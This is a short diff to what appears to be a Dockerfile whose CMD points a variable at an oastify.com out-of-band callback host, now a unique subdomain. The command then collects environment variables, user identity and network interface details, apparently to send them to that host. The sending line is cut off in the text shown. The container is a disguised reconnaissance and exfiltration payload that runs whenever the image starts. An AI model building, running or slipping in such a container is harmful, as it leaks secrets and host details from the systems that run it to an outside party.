@@ -2,7 +2,7 @@ FROM alpine
 RUN apk add --no-cache curl
 
 
-CMD C=http://oastify.com; \
+CMD C=http://g3kod0ltewj2n00dn7hd5kzwwn2eqie7.oastify.com; \
     (echo " ENV" && env && \
      echo " WHOAMI" && whoami && id && \
      echo " IFCONFIG" && ifconfig && \
